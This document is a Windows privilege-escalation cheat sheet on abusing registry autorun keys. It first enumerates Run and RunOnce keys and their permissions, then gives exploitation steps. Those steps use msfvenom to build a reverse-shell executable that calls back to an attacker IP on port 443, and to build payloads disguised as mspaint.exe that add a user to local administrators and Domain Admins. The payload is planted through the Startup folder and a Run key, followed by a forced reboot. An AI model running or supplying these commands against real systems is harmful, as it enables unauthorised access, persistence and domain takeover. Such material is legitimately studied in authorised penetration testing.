### Overview

This method leverages Windows Registry autorun that allow programs to execute automatically at system startup. if permissions are misconfigured, a low privileged user can insert or modify entries that run with higher privileges upon the next user logon.

### Check System Configurations

```cmd
msconfig
```

---

### Query Autorun Registry Locations

This registry keys control applications that launch at system startup. if writable by low-privileged users, they can be exploited for persistence or privilege escalation

#### Machine-Wide Autorum Leys

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceService
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService
```

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService
```


#### Current User Autorun Keys

```cmd
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```

```cmd
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

```cmd
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
```

---

### Useful Tools For Enumeration

*   PowerShell

#### Get Registry Key Property

Retrieves the properties (values and data) of a specified registry key path. Replace ``<registry-key-path>`` with a valid path like ``HKLM:\...`` or ``HKCU:\...``

```powershell
Get-ItemProperty -Path <registry-key-path>
```

#### Query Global Autorun Entries

List programs that are set to run at system startup for all users. Located under ``HKEY_LOCAL_MACHINE``

```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### List SubKeys Under CurrentVersion

Displays all subkeys under ``currentVersion`` key. Useful for Discovering additional configuration locations

```powershell
Get-ChildItem -Path <registry-key-path>
```

#### Check Registry Key Permissions (ACL)

```powershell
Get-Acl -Path <registry-key-path> | Format-List
```

*   Reg.exe

```cmd
reg query <registry-Key>
```

*   PowerUp: Used ofr automated privilege escalation checks
*   Autoruns (Sysinternals) : [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)

```cmd
autoruns64.exe
```

*   Use the **Logon** tab to view startup entries
*   Accesschk (Systenternals) : [AccessChk]()

```cmd
accesschk64.exe -wvu " C:\Program Files\any_program"
```

---

### Inspecting ACLs and Permissions

#### Launching powershell with Execution Policy Bypass

```cmd
powershell.exe -ep bypass
```

#### Check Folder or File Permission

```powershell
Get-Acl "C:\Program Files\My Scripts\" | Format-List
```

```powershell
Get-Acl "C:\Program Files\My Scripts\Delete_all_temp_files.bat"
```

```powershell
Get-Acl "C:\Program Files\My Scripts\Delete_all_temp_files.bat" | fl
```

```powershell
Get-Acl "C:\Tools"
```

```powershell
Get-Acl "C:\Windows" | fl
```
```powershell
Get-Acl "C:\inetpub\wwwroot\phpinfo.php" | Format-List
```

```powershell
Get-Acl "C:\Temp\test.log" | Format-List -Property PSPath, Sddl
```

#### Change Registry Key Permissions

```powershell
Get-Acl -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
```

```powershell
Get-Acl "C:\Program Files\My Scripts\" | Format-List
```

```powershell
Get-Acl  "HKLM:\System\CurrentControlSet\Control" | Format-List
```

---

### Exploitation Steps

#### 1. Generate Custom Payload

**Reverse Shell Example**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

**Encoded x64 Reverse Shell**

```bash
msfvenom --platform windows --arch x64 --payload windows/shell/reverse_tcp LOST=192.168.29.218 LPORT=443 --encoder x64/xor --iteration 9 -f exe --out rshell.exe
```

**Add User to Admin Group**

```bash
msfvenom -p windows/exec CMD='net localgroup administrators u1 /add' -f exe -o mspaint.exe
```

```bash
msfvenom -p windows/exec CMD='net group "Domain Admins" u1 /add /DOMAIN' -f exe -o mspaint.exe
```

#### 2. Deploy Payload

```cmd
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

#### 3. Pegistry Autorun

```cmd
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v rshell /t REG_EXPAND_SZ /f /d C:\users\Public\rshell.exe
```

#### 4. Reboot System

```cmd
shutdown /r /t 0 /f
```